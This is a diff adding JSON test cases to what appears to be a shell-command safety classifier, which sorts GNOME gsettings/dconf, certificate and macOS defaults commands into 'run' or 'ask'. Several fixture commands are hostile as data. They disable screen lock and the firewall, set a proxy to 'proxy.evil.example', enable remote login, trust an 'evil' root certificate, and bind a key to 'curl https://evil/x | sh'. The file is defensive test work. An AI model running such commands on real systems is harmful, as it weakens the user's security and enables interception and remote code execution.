@@ -10188,6 +10188,306 @@
   {
    "cmd": "declare greeting=\"hello $name\"",
    "verdict": "run"
+  },
+  {
+   "cmd": "gsettings set org.gnome.system.proxy mode 'manual'",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "system.network"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.system.proxy.http host 'proxy.evil.example'",
+   "verdict": "ask",
+   "rules": [
+    "system.network"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.screensaver lock-enabled false",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.session idle-delay 0",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.remote-desktop.rdp enable true",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.privacy disable-camera false",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.lockdown disable-lock-screen true",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.shell enabled-extensions \"['evil@x']\"",
+   "verdict": "ask",
+   "rules": [
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/ command 'curl https://evil/x | sh'",
+   "verdict": "ask",
+   "rules": [
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.default-applications.terminal exec 'evil'",
+   "verdict": "ask",
+   "rules": [
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "gsettings set org.gnome.desktop.interface gtk-theme 'Adwaita-dark'",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "system.settings"
+   ]
+  },
+  {
+   "cmd": "gsettings reset org.gnome.desktop.screensaver lock-enabled",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings reset-recursively org.gnome.system.proxy",
+   "verdict": "ask",
+   "rules": [
+    "system.network"
+   ]
+  },
+  {
+   "cmd": "gsettings --schemadir ~/schemas set org.gnome.desktop.screensaver lock-enabled false",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings set \"$schema\" lock-enabled false",
+   "verdict": "ask",
+   "rules": [
+    "system.security",
+    "system.network",
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "dconf write /org/gnome/desktop/screensaver/lock-enabled false",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "dconf write /org/gnome/system/proxy/mode \"'manual'\"",
+   "verdict": "ask",
+   "rules": [
+    "system.network"
+   ]
+  },
+  {
+   "cmd": "dconf write /org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/command \"'sh -c id'\"",
+   "verdict": "ask",
+   "rules": [
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "dconf write /org/gnome/desktop/interface/gtk-theme \"'Adwaita'\"",
+   "verdict": "ask",
+   "rules": [
+    "system.settings"
+   ]
+  },
+  {
+   "cmd": "dconf reset -f /org/gnome/desktop/",
+   "verdict": "ask",
+   "rules": [
+    "system.security",
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "dconf load / < settings.ini",
+   "verdict": "ask",
+   "rules": [
+    "system.security",
+    "system.network",
+    "system.autostart"
+   ]
+  },
+  {
+   "cmd": "certutil -d sql:$HOME/.pki/nssdb -A -t \"C,,\" -n evil -i evil.crt",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "trust anchor evil.crt",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "update-ca-trust extract",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ]
+  },
+  {
+   "cmd": "gsettings get org.gnome.desktop.interface gtk-theme",
+   "verdict": "run"
+  },
+  {
+   "cmd": "gsettings list-recursively org.gnome.desktop.screensaver",
+   "verdict": "run"
+  },
+  {
+   "cmd": "gsettings range org.gnome.desktop.session idle-delay",
+   "verdict": "run"
+  },
+  {
+   "cmd": "dconf read /org/gnome/desktop/screensaver/lock-enabled",
+   "verdict": "run"
+  },
+  {
+   "cmd": "dconf dump /org/gnome/terminal/",
+   "verdict": "run"
+  },
+  {
+   "cmd": "certutil -d sql:$HOME/.pki/nssdb -L",
+   "verdict": "run"
+  },
+  {
+   "cmd": "trust list",
+   "verdict": "run"
+  },
+  {
+   "cmd": "defaults write com.apple.screensaver askForPassword -int 0",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ],
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults -currentHost write com.apple.screensaver askForPassword -int 0",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults write com.apple.alf globalstate -int 0",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults delete com.apple.screensaver askForPassword",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults write com.apple.LaunchServices LSQuarantine -bool false",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "security add-trusted-cert -d -r trustRoot -k ~/Library/Keychains/login.keychain-db evil.pem",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "systemsetup -setremotelogin on",
+   "verdict": "ask",
+   "rules": [
+    "system.security"
+   ],
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults read com.apple.screensaver",
+   "verdict": "run",
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "defaults write com.apple.dock autohide -bool true",
+   "verdict": "run",
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "systemsetup -getremotelogin",
+   "verdict": "run",
+   "context": "darwin",
+   "shell": "zsh"
+  },
+  {
+   "cmd": "security find-certificate -a -p",
+   "verdict": "ask",
+   "context": "darwin",
+   "shell": "zsh"
   }
  ]
 }
